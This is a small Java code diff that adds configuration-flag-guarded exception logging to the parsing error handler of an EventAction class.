@@ -22,6 +22,10 @@ abstract class EventAction extends SubAction {
 			this.eventId = params.getInt("event");
 
 		} catch (ConfigurationException e) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e);
+			}
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (parse) Error: " + e);
 			}
